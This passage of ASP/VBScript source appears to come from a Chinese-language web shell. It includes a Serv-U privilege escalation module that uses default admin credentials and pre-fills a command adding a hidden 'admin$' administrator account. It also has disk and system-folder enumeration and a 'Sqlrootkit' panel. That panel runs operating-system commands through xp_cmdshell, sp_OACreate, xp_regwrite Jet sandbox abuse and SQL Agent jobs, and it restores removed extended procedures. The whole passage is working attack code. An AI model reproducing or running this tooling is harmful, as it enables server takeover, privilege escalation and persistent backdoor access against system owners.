"-QuotaEnable=0"&vbCrLf&"-MaxUsersLoginPerIP=-1"&vbCrLf&"-SpeedLimitUp=0"&vbCrLf&"-SpeedLimitDown=0"&vbCrLf&_
"-MaxNrUsers=-1"&vbCrLf&"-IdleTimeOut=600"&vbCrLf&"-SessionTimeOut=-1"&vbCrLf&"-Expire=0"&vbCrLf&"-RatioUp=1"&vbCrLf&_
"-RatioDown=1"&vbCrLf&"-RatiosCredit=0"&vbCrLf&"-QuotaCurrent=0"&vbCrLf&"-QuotaMaximum=0"&vbCrLf&_
"-Maintenance=System"&vbCrLf&"-PasswordType=Regular"&vbCrLf&"-Ratios=None"&vbCrLf&" Access=c:\\|RWAMELCDP"&vbCrLf
quit="QUIT"&vbCrLf
newuser=replace(newuser,"c:",f)
select case SUaction
case 1
set a=Server.CreateObject(Sot(13,0))
a.open "GET", "http://127.0.0.1:"&port&"/goldsun/upadmin/s1",True, "", ""
a.send loginuser&loginpass&mt&deldomain&newdomain&newuser&quit
set session("a")=a
o"<form method='post' name='goldsun'><input name='u' type='hidden' id='u' value='"&user&"'></td><input name='p' type='hidden' id='p' value='"&pass&"'></td><input name='port' type='hidden' id='port' value='"&port&"'></td><input name='c' type='hidden' id='c' value='"&cmd&"' size='50'><input name='f' type='hidden' id='f' value='"&f&"' size='50'><input name='SUaction' type='hidden' id='SUaction' value='2'></form><script language='javascript'>document.write('<center>正在连接 127.0.0.1:"&port&",使用用户名: "&user&",口令："&pass&"...<center>');setTimeout('document.all.goldsun.submit();',4000);</script>"
case 2
set b=Server.CreateObject(Sot(13,0))
b.open "GET", "http://127.0.0.1:"&ftpport&"/goldsun/upadmin/s2", True, "", ""
b.send "User go"&vbCrLf&"pass od"&vbCrLf&"site exec "&cmd&vbCrLf&quit
set session("b")=b
o"<form method='post' name='goldsun'><input name='u' type='hidden' id='u' value='"&user&"'></td><input name='p' type='hidden' id='p' value='"&pass&"'></td><input name='port' type='hidden' id='port' value='"&port&"'></td><input name='c' type='hidden' id='c' value='"&cmd&"' size='50'><input name='f' type='hidden' id='f' value='"&f&"' size='50'><input name='SUaction' type='hidden' id='SUaction' value='3'></form><script language='javascript'>document.write('<br><center>正在提升权限,请等待...,<center>');setTimeout(""document.all.goldsun.submit();"",4000);</script>"
case 3
set c=Server.CreateObject(Sot(13,0))
c.open "GET", "http://127.0.0.1:"&port&"/goldsun/upadmin/s3", True, "", ""
c.send loginuser&loginpass&mt&deldomain&quit
set session("c")=c
o"<center>成功与否看人品,提权完毕,已执行了命令：<br><font color=red>"&cmd&"</font><br><br>"
o"<input type=button value=' 返回继续 ' onClick=""location.href='?Action=Servu';"">"
o"</center>"
case else
on error resume next
set a=session("a"):set b=session("b"):set c=session("c"):a.abort:Set a=Nothing:b.abort:Set b=Nothing:c.abort:Set c=Nothing
o"<center><br><form method='post' name='goldsun'><table width='500' height='163'><tr align='center' valign='middle'><td colspan='2' id=s><font face=webdings>8</font> <B>Serv-U 提升权限 ASP版</b></td></tr><tr align='center' valign='middle'><td width='100' id=d>用户名：</td><td width='379' id=d><input name='u' type='text' id='u' value='LocalAdministrator'></td></tr><tr align='center' valign='middle'><td id=d>口　令：</td><td id=d><input name='p' type='text' id='p' value='#l@$ak#.lk;0@P'></td></tr><tr align='center' valign='middle'><td id=d>端　口：</td><td id=d><input name='port' type='text' id='port' value='43958'></td></tr><tr align='center' valign='middle'><td id=d>路　径：</td><td id=d><input name='f' type='text' id='f' value='"&f&"'></td></tr><tr align='center' valign='middle'><td id=d>命　令：</td><td id=d><input name='c' type='text' id='c' value='cmd /c net user admin$ admin /add&net localgroup administrators admin$ /add' size='55'></td></tr><tr align='center' valign='middle'><td colspan='2' id=d><input type='submit' name='Submit' value='Just Go'>&nbsp;<input type='reset' name='Submit2' value='Reset'><input name='SUaction' type='hidden' id='action' value='1'></td></tr></table></form></center>"
end select
function Gpath()
on error resume next
err.clear:set f=Server.CreateObject(Sot(0,0))
if err.number>0 then:gpath="c:":exit function:end if:gpath=f.GetSpecialFolder(0):gpath=lcase(left(gpath,2)):set f=nothing
end function

Sub ScanDriveForm() '扫描磁盘信息
 Dim FSO,DriveB
	Set FSO = Server.Createobject("Scripting.FileSystemObject")
	
o "<table width='800' align='center'>"
o "<br><TR><TD height=22 colspan=5 align=center id=s><b>磁盘/系统文件夹信息</b></TD></TR>"

 For Each DriveB in FSO.Drives
o "<TR align=middle ><FORM action=?Action=ScanDrive&Drive="&DriveB.DriveLetter&" method=Post>"

o "<TD height='20' width=25"&chr(37)&" id=d><B>盘符</B></TD>"	
o "<TD width=15"&chr(37)&" id=d>"&DriveB.DriveLetter&":</TD> "
o "<TD width=20"&chr(37)&" id=d><B>类型</B></TD>"
o "<TD width=20"&chr(37)&" id=d>"

	 Select Case DriveB.DriveType
	 Case 1: o "可移动"
	 Case 2: o "本地硬盘"
	 Case 3: o "网络磁盘"
	 Case 4: o "CD-ROM"
	 Case 5: o "RAM磁盘"
	 Case else: o "未知类型"
	 End Select
	
o "</TD><TD id=d><INPUT type=submit value='Generate reports'></TD></FORM></TR>"
Next
o "<TR><FORM action=?Action=ScFolder&Folder="&FSO.GetSpecialFolder(0)&" method=Post>"
o "<TD height='20'align=middle id=d><B>Windows文件夹</B></TD>"
o "<TD colspan=3 id=d>"&FSO.GetSpecialFolder(0)&"</TD>"
o "<TD align=middle id=d><INPUT type=submit value='Generate reports'></TD></FORM></TR>"
o "<TR><FORM action=?Action=ScFolder&Folder="&FSO.GetSpecialFolder(1)&" method=Post>"
o "<TD height='20' align=middle id=d><B>System32文件夹</B></TD>"
o "<TD colspan=3 id=d>"&FSO.GetSpecialFolder(1)&"</TD>"
o "<TD height='20' align=middle id=d><INPUT type=submit value='Generate reports'></TD></FORM></TR>"
o "<TR> <FORM action=?Action=ScFolder&Folder="&FSO.GetSpecialFolder(2)&" method=Post>"
o "<TD height='20' align=middle id=d><B>系统临时文件夹</B></TD>"
o "<TD colspan=3 id=d>"&FSO.GetSpecialFolder(2)&"</TD>"
o "<TD align=middle id=d><INPUT type=submit value='Generate reports'></TD></FORM></TR></TABLE><table width='800' align='center'><BR><DIV><b>当前网站绝对路径:"&Server.MapPath("/")&"</b><FORM Action=?Action=ScFolder method=Post><b id=x>Queries the specified folder：</b>"
o "<INPUT type=text name=Folder size=39><INPUT type=submit value='Generate reports'>　<b id=x>Example F:\haifan\</b></FORM><DIV></table>"
	Set FSO=Nothing
End Sub

Sub ScanDrive(Drive) 
 Dim FSO,TestDrive,BaseFolder,TempFolders,Temp_Str,D
	If Drive <> "" Then
	 Set FSO = Server.Createobject("Scripting.FileSystemObject")
	Set TestDrive = FSO.GetDrive(Drive)
	If TestDrive.IsReady Then
	 Temp_Str = "<LI>磁盘分区类型：" & Red(TestDrive.FileSystem) & "<LI>磁盘序列号：" & Red(TestDrive.SerialNumber) & "<LI>磁盘共享名：" & Red(TestDrive.ShareName) & "<LI>磁盘总容量：" & Red(Int(TestDrive.TotalSize/1073741824)) & Red("GB") & "<LI>磁盘卷名：" & Red(TestDrive.VolumeName) & "<LI>磁盘根目录:" & ScReWr((Drive & ":\"))
	Set BaseFolder = TestDrive.RootFolder
	Set TempFolders = BaseFolder.SubFolders
	For Each D in TempFolders
	 Temp_Str = Temp_Str & "<LI>文件夹：" & ScReWr(D)
	Next
	Set TempFolder = Nothing
	Set BaseFolder = Nothing
	 Else
	 Temp_Str = Temp_Str & "<LI>磁盘根目录:" & Red("不可读:(")
	Dim TempFolderList,t:t=0
	Temp_Str = Temp_Str & "<LI>" & Red("穷举目录测试：")
	TempFolderList = Array("windows","winnt","win","win2000","win98","web","winme","windows2000","asp","php","Tools","Documents and Settings","Program Files","Inetpub","ftp","wmpub","tftp","wwwroot")
	For i = 0 to Ubound(TempFolderList)
	 If FSO.FolderExists(Drive & ":\" & TempFolderList(i)) Then
	 t = t+1
	Temp_Str = Temp_Str & "<LI>发现文件夹：" & ScReWr(Drive & ":\" & TempFolderList(i))
	 End if
	 Next
	If t=0 then Temp_Str = Temp_Str & "<LI>已穷举" & Drive & "盘根目录，但未有发现:("
	 End if
	Set TestDrive = Nothing
	 Set FSO = Nothing
	Temp_Str = Temp_Str & "<br><br>注意：不要多次刷新本页面，否则在只写文件夹会留下大量垃圾文件!"
	Message Drive & ":磁盘信息",Temp_Str,1
	End if
End Sub

Sub ScFolder(folder) 
	Dim FSO,OFolder,TempFolder,Scmsg,S
	Set FSO = Server.Createobject("Scripting.FileSystemObject")
	If FSO.FolderExists(folder) Then
	 Set OFolder = FSO.GetFolder(folder)
	Set TempFolders = OFolder.SubFolders
	Scmsg = "<LI>指定文件夹根目录：" & ScReWr(folder)
	For Each S in TempFolders
	 Scmsg = Scmsg&"<LI>文件夹：" & ScReWr(S) 
	Next
	Set TempFolders = Nothing
	Set OFolder = Nothing
	Else
	 Scmsg = Scmsg & "<LI>文件夹：" & Red(folder & "不存在或无读权限!")
	End if
	Scmsg = Scmsg & "<br><br>注意：不要多次刷新本页面，否则在只写文件夹会留下大量垃圾文件!"
	Set FSO = Nothing
	Message "文件夹信息",Scmsg,1
End Sub
Function Sqlrootkit()
IF SESSION("LOGIN")="" THEN
                           RESPONSE.WRITE "<CENTER><FONT COLOR=RED>没有登陆</FONT></CENTER><BR>"
			   ELSE RESPONSE.WRITE "<CENTER><FONT COLOR=RED>已经登陆</FONT></CENTER><BR>"
END IF
                           RESPONSE.WRITE "<CENTER><A HREF="&REQUEST.SERVERVARIABLES("URL")&"?SQLAAA=LOGOUT><FONT COLOR=BLACK>退出登陆</FONT></A></CENTER><BR>"

IF REQUEST("SQLAAA")="LOGIN" THEN
		       SET ADOCONN=SERVER.CREATEOBJECT("ADODB.CONNECTION") 
 		       ADOCONN.OPEN "PROVIDER=SQLOLEDB.1;DATA SOURCE=" & REQUEST.FORM("SERVER") & "," & REQUEST.FORM("PORT") & ";PASSWORD=" & REQUEST.FORM("PASS") & ";UID=" & REQUEST.FORM("NAME")
                       IF ERR.NUMBER=-2147467259 THEN 
                       RESPONSE.WRITE "<FONT COLOR=RED>数据源连接错误，请检查！</FONT>"
                       RESPONSE.END
                       ELSEIF ERR.NUMBER=-2147217843 THEN
                       RESPONSE.WRITE "<FONT COLOR=RED>用户名密码错误错误，请检查！</FONT>"
                       RESPONSE.END
                       ELSEIF ERR.NUMBER=0 THEN
                       STRQUERY="SELECT @@VERSION"
		       SET RECRESULT = ADOCONN.EXECUTE(STRQUERY)
		       IF INSTR(RECRESULT(0),"NT 5.0") THEN
		       RESPONSE.WRITE "<FONT COLOR=RED>WINDOWS 2000系统</FONT><BR>"
                       SESSION("SYSTEM")="2000"
                       ELSEIF INSTR(RECRESULT(0),"NT 5.1")  THEN
                       RESPONSE.WRITE "<FONT COLOR=RED>WINDOWS XP系统</FONT><BR>"
                       SESSION("SYSTEM")="XP"
                       ELSEIF INSTR(RECRESULT(0),"NT 5.2")  THEN
                       RESPONSE.WRITE "<FONT COLOR=RED>WINDOWS 2003系统</FONT><BR>"
                       SESSION("SYSTEM")="2003"
                       ELSE
                       RESPONSE.WRITE "<FONT COLOR=RED>其他系统</FONT><BR>"
                       SESSION("SYSTEM")="NO"
                       END IF
                       STRQUERY="SELECT IS_SRVROLEMEMBER('SYSADMIN')"
		       SET RECRESULT = ADOCONN.EXECUTE(STRQUERY)
                       IF RECRESULT(0)=1 THEN
                       RESPONSE.WRITE "<FONT COLOR=RED>恭喜！SQL SERVER最高权限</FONT><BR>"
                       SESSION("PRI")=1
                       ELSE
                       RESPONSE.WRITE "<FONT COLOR=RED>郁闷，权限不够估计不能执行命令！</FONT><BR>"
                       SESSION("PRI")=0
                       END IF              
		       SESSION("LOGIN")="YES"
		       SESSION("NAME")=REQUEST.FORM("NAME")
		       SESSION("PASS")=REQUEST.FORM("PASS")
		       SESSION("SERVER")=REQUEST.FORM("SERVER")
		       SESSION("PORT")=REQUEST.FORM("PORT")
                       END IF

ELSEIF REQUEST("SQLAAA")="TEST"  THEN
                       IF SESSION("LOGIN")<>"" THEN
                       IF SESSION("SYSTEM")="2000" THEN
                       RESPONSE.WRITE "<FONT COLOR=RED>WINDOWS 2000系统</FONT><BR>"
                       ELSEIF SESSION("SYSTEM")="XP" THEN
                       RESPONSE.WRITE "<FONT COLOR=RED>WINDOWS XP系统</FONT><BR>"
                       ELSEIF SESSION("SYSTEM")="2003" THEN
                       RESPONSE.WRITE "<FONT COLOR=RED>WINDOWS 2003系统</FONT><BR>"
                       ELSE
                       RESPONSE.WRITE "<FONT COLOR=RED>其他操作系统</FONT><BR>"
                       END IF
                       IF SESSION("PRI")=1 THEN
                       RESPONSE.WRITE "<FONT COLOR=RED>恭喜！SQL SERVER最高权限</FONT><BR>"
                       ELSE 
                       RESPONSE.WRITE "<FONT COLOR=RED>郁闷，权限不够估计不能执行命令！</FONT><BR>"
                       END IF
		       SET ADOCONN=SERVER.CREATEOBJECT("ADODB.CONNECTION") 
 		       ADOCONN.OPEN "PROVIDER=SQLOLEDB.1;DATA SOURCE=" & SESSION("SERVER") & "," & SESSION("PORT") & ";PASSWORD=" & SESSION("PASS") & ";UID=" & SESSION("NAME")        

                       STRQUERY="SELECT COUNT(*) FROM MASTER.DBO.SYSOBJECTS WHERE XTYPE='X' AND NAME='XP_CMDSHELL'"
		       SET RECRESULT = ADOCONN.EXECUTE(STRQUERY) 
		       IF RECRESULT(0) THEN
		       SESSION("XP_CMDSHELL")=1 
		       RESPONSE.WRITE "<FONT COLOR=RED>XP_CMDSHELL............. 存在!</FONT>"
                       ELSE
		       SESSION("XP_CMDSHELL")=0 
		       RESPONSE.WRITE "<FONT COLOR=RED>XP_CMDSHELL............. 不存在!</FONT>"
                       END IF
		       STRQUERY="SELECT COUNT(*) FROM MASTER.DBO.SYSOBJECTS WHERE XTYPE='X' AND NAME='SP_OACREATE'"
		       SET RECRESULT = ADOCONN.EXECUTE(STRQUERY) 
		       IF RECRESULT(0) THEN 
		       RESPONSE.WRITE "<BR><FONT COLOR=RED>SP_OACREATE............. 存在!</FONT>"
		       SESSION("SP_OACREATE")=1
                       ELSE 
		       RESPONSE.WRITE "<BR><FONT COLOR=RED>SP_OACREATE............. 不存在!</FONT>"
                       SESSION("SP_OACREATE")=0
                       END IF
		       STRQUERY="SELECT COUNT(*) FROM MASTER.DBO.SYSOBJECTS WHERE XTYPE='X' AND NAME='XP_REGWRITE'"
		       SET RECRESULT = ADOCONN.EXECUTE(STRQUERY) 
		       IF RECRESULT(0) THEN 
		       RESPONSE.WRITE "<BR><FONT COLOR=RED>XP_REGWRITE............. 存在!</FONT>"
		       SESSION("XP_REGWRITE")=1
                       ELSE 
		       RESPONSE.WRITE "<BR><FONT COLOR=RED>XP_REGWRITE............. 不存在!</FONT>"
		       SESSION("XP_REGWRITE")=0
                       END IF
		       STRQUERY="SELECT COUNT(*) FROM MASTER.DBO.SYSOBJECTS WHERE XTYPE='X' AND NAME='XP_SERVICECONTROL'"
		       SET RECRESULT = ADOCONN.EXECUTE(STRQUERY) 
		       IF RECRESULT(0) THEN 
		       RESPONSE.WRITE "<BR><FONT COLOR=RED>XP_SERVICECONTROL 存在!</FONT>"
		       SESSION("XP_SERVICECONTROL")=1
                       ELSE 
		       RESPONSE.WRITE "<BR><FONT COLOR=RED>XP_SERVICECONTROL 不存在!</FONT>"
		       SESSION("XP_SERVICECONTROL")=0
                       END IF
                       ELSE 
                       RESPONSE.WRITE "<SCRIPT>ALERT('操作超时，重新登陆！')</SCRIPT>"
                       RESPONSE.WRITE "<CENTER><A HREF="&REQUEST.SERVERVARIABLES("URL")&"?SQLAAA=LOGOUT><FONT COLOR=BLACK>登陆超时</FONT>"
                       RESPONSE.END
                       END IF 

ELSEIF REQUEST("SQLAAA")="CMD" THEN
                       IF SESSION("LOGIN")<>"" THEN
                       IF SESSION("PRI")=1 THEN
		       IF REQUEST("TOOL")="XP_CMDSHELL" THEN
		       SET ADOCONN=SERVER.CREATEOBJECT("ADODB.CONNECTION") 
 		       ADOCONN.OPEN "PROVIDER=SQLOLEDB.1;DATA SOURCE=" & SESSION("SERVER") & "," & SESSION("PORT") & ";PASSWORD=" & SESSION("PASS") & ";UID=" & SESSION("NAME")
		       IF REQUEST.FORM("CMD")<>"" THEN 
  		       STRQUERY = "EXEC MASTER.DBO.XP_CMDSHELL '" & REQUEST.FORM("CMD") & "'" 
                       SET RECRESULT = ADOCONN.EXECUTE(STRQUERY) 
                       IF NOT RECRESULT.EOF THEN 
                       DO WHILE NOT RECRESULT.EOF 
                       STRRESULT = STRRESULT & CHR(13) & RECRESULT(0) 
                       RECRESULT.MOVENEXT 
                       LOOP
		       END IF
		       SET RECRESULT = NOTHING
                       RESPONSE.WRITE "<TEXTAREA ROWS=10 COLS=50>"
                       RESPONSE.WRITE "利用"&REQUEST("TOOL")&"扩展执行"
                       RESPONSE.WRITE REQUEST.FORM("CMD") 
                       RESPONSE.WRITE STRRESULT
                       RESPONSE.WRITE "</TEXTAREA>"
		       END IF 
		       		       
                       ELSEIF REQUEST("TOOL")="SP_OACREATE" THEN 
		       SET ADOCONN=SERVER.CREATEOBJECT("ADODB.CONNECTION") 
 		       ADOCONN.OPEN "PROVIDER=SQLOLEDB.1;DATA SOURCE=" & SESSION("SERVER") & "," & SESSION("PORT") & ";PASSWORD=" & SESSION("PASS") & ";UID=" & SESSION("NAME")
		       IF REQUEST.FORM("CMD")<>"" THEN 
  		       STRQUERY = "CREATE TABLE [JNC](RESULTTXT NVARCHAR(1024) NULL);USE MASTER DECLARE @O INT EXEC SP_OACREATE 'WSCRIPT.SHELL',@O OUT EXEC SP_OAMETHOD @O,'RUN',NULL,'CMD /C "&REQUEST("CMD")&" > 8617.TMP',0,TRUE;BULK INSERT [JNC] FROM '8617.TMP' WITH (KEEPNULLS);"
		       ADOCONN.EXECUTE(STRQUERY)
                       STRQUERY = "SELECT * FROM JNC"
		       SET RECRESULT = ADOCONN.EXECUTE(STRQUERY)
		       IF NOT RECRESULT.EOF THEN 
                       DO WHILE NOT RECRESULT.EOF 
                       STRRESULT = STRRESULT & CHR(13) & RECRESULT(0) 
                       RECRESULT.MOVENEXT 
                       LOOP 
                       END IF
		       SET RECRESULT = NOTHING
                       RESPONSE.WRITE "<TEXTAREA ROWS=10 COLS=50>"
		       RESPONSE.WRITE "利用"&REQUEST("TOOL")&"扩展执行"	
                       RESPONSE.WRITE REQUEST.FORM("CMD") 
                       RESPONSE.WRITE STRRESULT
                       RESPONSE.WRITE "</TEXTAREA>"
		       STRQUERY = "DROP TABLE [JNC];DECLARE @O INT EXEC SP_OACREATE 'WSCRIPT.SHELL',@O OUT EXEC SP_OAMETHOD @O,'RUN',NULL,'CMD /C DEL 8617.TMP'"
 		       ADOCONN.EXECUTE(STRQUERY)
		       END IF

                       ELSEIF REQUEST("TOOL")="XP_REGWRITE" THEN
                       IF SESSION("SYSTEM")="2000" THEN
                       PATH="C:\WINNT\SYSTEM32\IAS\IAS.MDB"
                       ELSE
                       PATH="C:\WINDOWS\SYSTEM32\IAS\IAS.MDB"
                       END IF
		       SET ADOCONN=SERVER.CREATEOBJECT("ADODB.CONNECTION") 
 		       ADOCONN.OPEN "PROVIDER=SQLOLEDB.1;DATA SOURCE=" & SESSION("SERVER") & "," & SESSION("PORT") & ";PASSWORD=" & SESSION("PASS") & ";UID=" & SESSION("NAME")
		       IF REQUEST.FORM("CMD")<>"" THEN
		       CMD=CHR(34)&"CMD.EXE /C "&REQUEST.FORM("CMD")&" > 8617.TMP"&CHR(34)
		       STRQUERY = "CREATE TABLE [JNC](RESULTTXT NVARCHAR(1024) NULL);EXEC MASTER..XP_REGWRITE 'HKEY_LOCAL_MACHINE','SOFTWARE\MICROSOFT\JET\4.0\ENGINES','SANDBOXMODE','REG_DWORD',0;SELECT * FROM OPENROWSET('MICROSOFT.JET.OLEDB.4.0',';DATABASE=" & PATH &"','SELECT SHELL("&CMD&")');"
                       ADOCONN.EXECUTE(STRQUERY)
		       STRQUERY = "SELECT * FROM OPENROWSET('MICROSOFT.JET.OLEDB.4.0',';DATABASE=" & PATH &"','SELECT SHELL("&CHR(34)&"CMD.EXE /C COPY 8617.TMP JNC.TMP"&CHR(34)&")');BULK INSERT [JNC] FROM 'JNC.TMP' WITH (KEEPNULLS);"
		       SET RECRESULT = ADOCONN.EXECUTE(STRQUERY)
		       STRQUERY="SELECT * FROM [JNC];"
                       SET RECRESULT = ADOCONN.EXECUTE(STRQUERY)
		       IF NOT RECRESULT.EOF THEN 
                       DO WHILE NOT RECRESULT.EOF 
                       STRRESULT = STRRESULT & CHR(13) & RECRESULT(0) 
                       RECRESULT.MOVENEXT 
                       LOOP 
                       END IF
                       SET RECRESULT = NOTHING
                       RESPONSE.WRITE "<TEXTAREA ROWS=10 COLS=50>"
                       RESPONSE.WRITE "利用"&REQUEST("TOOL")&"扩展执行"
                       RESPONSE.WRITE REQUEST.FORM("CMD") 
                       RESPONSE.WRITE STRRESULT
                       RESPONSE.WRITE "</TEXTAREA>"
		       STRQUERY = "DROP TABLE [JNC];EXEC MASTER..XP_REGWRITE 'HKEY_LOCAL_MACHINE','SOFTWARE\MICROSOFT\JET\4.0\ENGINES','SANDBOXMODE','REG_DWORD',1;SELECT * FROM OPENROWSET('MICROSOFT.JET.OLEDB.4.0',';DATABASE=" & PATH &"','SELECT SHELL("&CHR(34)&"CMD.EXE /C DEL 8617.TMP&&DEL JNC.TMP"&CHR(34)&")');"
		       ADOCONN.EXECUTE(STRQUERY)
		       END IF

		       ELSEIF REQUEST("TOOL")="SQLSERVERAGENT" THEN
		       SET ADOCONN=SERVER.CREATEOBJECT("ADODB.CONNECTION") 
 		       ADOCONN.OPEN "PROVIDER=SQLOLEDB.1;DATA SOURCE=" & SESSION("SERVER") & "," & SESSION("PORT") & ";PASSWORD=" & SESSION("PASS") & ";UID=" & SESSION("NAME")

		       IF REQUEST.FORM("CMD")<>"" THEN
                       IF SESSION("SQLSERVERAGENT")=0 THEN
                       STRQUERY = "EXEC MASTER.DBO.XP_SERVICECONTROL 'START','SQLSERVERAGENT';"
                       ADOCONN.EXECUTE(STRQUERY)
                       SESSION("SQLSERVERAGENT")=1
                       END IF

		       STRQUERY = "USE MSDB CREATE TABLE [JNCSQL](RESULTTXT NVARCHAR(1024) NULL) EXEC SP_DELETE_JOB NULL,'X' EXEC SP_ADD_JOB 'X' EXEC SP_ADD_JOBSTEP NULL,'X',NULL,'1','CMDEXEC','CMD /C "&REQUEST.FORM("CMD")&"' EXEC SP_ADD_JOBSERVER NULL,'X',@@SERVERNAME EXEC SP_START_JOB 'X';"
                       ADOCONN.EXECUTE(STRQUERY)
                       ADOCONN.EXECUTE(STRQUERY)
                       ADOCONN.EXECUTE(STRQUERY)
                    
                       RESPONSE.WRITE "<TEXTAREA ROWS=10 COLS=50>"
                       RESPONSE.WRITE "利用"&REQUEST("TOOL")&"扩展执行"
                       RESPONSE.WRITE REQUEST.FORM("CMD") 
                       RESPONSE.WRITE VBCRF
                       RESPONSE.WRITE "此扩展无回显，建议通过重定向查看命令结果"
                       RESPONSE.WRITE "</TEXTAREA>"
		       STRQUERY = "USE MSDB DROP TABLE [JNCSQL];"
                       ADOCONN.EXECUTE(STRQUERY)
                       END IF
                       ELSEIF REQUEST("TOOL")="" THEN 
                       RESPONSE.WRITE "<SCRIPT>ALERT('选择你要使用的扩展')</SCRIPT>"
                       END IF
                       ELSE
                       RESPONSE.WRITE "<SCRIPT>ALERT('权限不够哦！')</SCRIPT>"
                       END IF
                       ELSE 
                       RESPONSE.WRITE "<SCRIPT>ALERT('操作超时，重新登陆！')</SCRIPT>"
                       RESPONSE.WRITE "<CENTER><A HREF="&REQUEST.SERVERVARIABLES("URL")&"?SQLAAA=LOGOUT><FONT COLOR=BLACK>登陆超时</FONT>"
                       RESPONSE.END
                       END IF

ELSEIF REQUEST("SQLAAA")="RESUME" THEN
                       IF SESSION("LOGIN")<>"" THEN
                       SET ADOCONN=SERVER.CREATEOBJECT("ADODB.CONNECTION") 
 		       ADOCONN.OPEN "PROVIDER=SQLOLEDB.1;DATA SOURCE=" & SESSION("SERVER") & "," & SESSION("PORT") & ";PASSWORD=" & SESSION("PASS") & ";UID=" & SESSION("NAME")
                       IF SESSION("XP_CMDSHELL")=0 THEN
                       STRQUERY="DBCC ADDEXTENDEDPROC ('XP_CMDSHELL','XPLOG70.DLL')"
		       ADOCONN.EXECUTE(STRQUERY)	
                       RESPONSE.WRITE "<FONT COLOR=RED>已经尝试恢复XP_CMDSHELL</FONT>"
                       ELSEIF SESSION("SP_OACREATE")=0 THEN
		       STRQUERY="DBCC ADDEXTENDEDPROC ('SP_OACREATE','ODSOLE70.DLL')"
		       ADOCONN.EXECUTE(STRQUERY)	
                       RESPONSE.WRITE "<FONT COLOR=RED>已经尝试恢复SP_OACREATE</FONT>"
		       ELSEIF SESSION("XP_REGWRITE")=0 THEN
		       STRQUERY="DBCC ADDEXTENDEDPROC ('XP_REGWRITE','XPSTAR.DLL')"
		       ADOCONN.EXECUTE(STRQUERY)	
                       RESPONSE.WRITE "<FONT COLOR=RED>已经尝试恢复XP_REGWRITE</FONT>"	
		       ELSE RESPONSE.WRITE "<FONT COLOR=RED>恭喜！组件齐全</FONT>"	
                       END IF
                       ELSE 
                       RESPONSE.WRITE "<SCRIPT>ALERT('操作超时，重新登陆！')</SCRIPT>"
                       RESPONSE.WRITE "<CENTER><A HREF="&REQUEST.SERVERVARIABLES("URL")&"?SQLAAA=LOGOUT><FONT COLOR=BLACK>登陆超时</FONT>"
                       RESPONSE.END
                       END IF 	
                                
ELSEIF REQUEST("SQLAAA")="SQL" THEN
                       IF SESSION("LOGIN")<>"" THEN
		       IF REQUEST.FORM("SQL")<>"" THEN
                       SET ADOCONN=SERVER.CREATEOBJECT("ADODB.CONNECTION") 
 		       ADOCONN.OPEN "PROVIDER=SQLOLEDB.1;DATA SOURCE=" & SESSION("SERVER") & "," & SESSION("PORT") & ";PASSWORD=" & SESSION("PASS") & ";UID=" & SESSION("NAME")
                       STRQUERY=REQUEST.FORM("SQL")
                       SET RECRESULT = ADOCONN.EXECUTE(STRQUERY) 
                       IF NOT RECRESULT.EOF THEN 
                       DO WHILE NOT RECRESULT.EOF 
                       STRRESULT = STRRESULT & CHR(13) & RECRESULT(0) 
                       RECRESULT.MOVENEXT 
                       LOOP
		       END IF
		       SET RECRESULT = NOTHING
                       RESPONSE.WRITE "<TEXTAREA ROWS=10 COLS=50>"
                       RESPONSE.WRITE "执行SQL语句:"
                       RESPONSE.WRITE REQUEST.FORM("SQL") 
                       RESPONSE.WRITE STRRESULT
                       RESPONSE.WRITE "</TEXTAREA>"
                       END IF
                       ELSE 
                       RESPONSE.WRITE "<SCRIPT>ALERT('操作超时，重新登陆！')</SCRIPT>"
                       RESPONSE.WRITE "<CENTER><A HREF="&REQUEST.SERVERVARIABLES("URL")&"?SQLAAA=LOGOUT><FONT COLOR=BLACK>登陆超时</FONT>"
                       RESPONSE.END
                       END IF

ELSEIF REQUEST("SQLAAA")="LOGOUT" THEN
                       SET ADOCONN=NOTHING
                       SESSION("LOGIN")=""
                       SESSION("NAME")=""
                       SESSION("PASS")=""
                       SESSION("SERVER")=""
                       SESSION("PORT")=""
                       SESSION("SYSTEM")=""
                       SESSION("PRI")=""		              
END IF
IF SESSION("LOGIN")="" THEN
			   RESPONSE.WRITE "<FORM NAME=FORM METHOD=POST SQLAAA="&REQUEST.SERVERVARIABLES("URL")&">"
			   RESPONSE.WRITE "<P>SQL用户名："
			   RESPONSE.WRITE "<INPUT NAME=NAME TYPE=TEXT ID=NAME VALUE="&SESSION("NAME")&">"
 		           RESPONSE.WRITE "  SQL密码："
			   RESPONSE.WRITE "<INPUT NAME=PASS TYPE=PASSWORD ID=PASS VALUE="&SESSION("PASS")&">"
			   RESPONSE.WRITE "<P>SQL服务器："
			   RESPONSE.WRITE "<INPUT NAME=PORT TYPE=TEXT ID=SERVER VALUE=127.0.0.1>"
 		           RESPONSE.WRITE "  SQL端口："
			   RESPONSE.WRITE "<INPUT NAME=PORT TYPE=TEXT ID=PORT VALUE=1433>"
			   RESPONSE.WRITE "  <INPUT NAME=SQLAAA TYPE=SUBMIT VALUE=LOGIN>"
			   RESPONSE.WRITE "</FORM>"

ELSE                       RESPONSE.WRITE "<FORM NAME=FORM METHOD=POST SQLAAA="&REQUEST.SERVERVARIABLES("URL")&">"
			   RESPONSE.WRITE "<P>组件检测："
			   RESPONSE.WRITE "  <INPUT NAME=SQLAAA TYPE=HIDDEN VALUE=TEST>"
			   RESPONSE.WRITE "  <INPUT TYPE=SUBMIT VALUE=检测组件>"
			   RESPONSE.WRITE "</FORM>"

                           RESPONSE.WRITE "<FORM NAME=FORM METHOD=POST SQLAAA="&REQUEST.SERVERVARIABLES("URL")&">"
			   RESPONSE.WRITE "<P>组件恢复："
			   RESPONSE.WRITE "  <INPUT NAME=SQLAAA TYPE=HIDDEN VALUE=RESUME>"
			   RESPONSE.WRITE "  <INPUT TYPE=SUBMIT VALUE=恢复组件>"
			   RESPONSE.WRITE "</FORM>"

		           RESPONSE.WRITE "<FORM NAME=FORM METHOD=POST SQLAAA="&REQUEST.SERVERVARIABLES("URL")&">"
			   RESPONSE.WRITE "<P>系统命令："
			   RESPONSE.WRITE "  <INPUT NAME=CMD TYPE=TEXT>"
			   RESPONSE.WRITE "<SELECT NAME='TOOL' ><OPTION VALUE=''>----请选择运行程序的组件----</OPTION><OPTION VALUE=XP_CMDSHELL>XP_CMDSHELL</OPTION><OPTION VALUE=SP_OACREATE>SP_OACREATE</OPTION><OPTION VALUE=XP_REGWRITE>XP_REGWRITE</OPTION><OPTION VALUE=SQLSERVERAGENT>SQLSERVERAGENT</OPTION></OPTION></SELECT>"
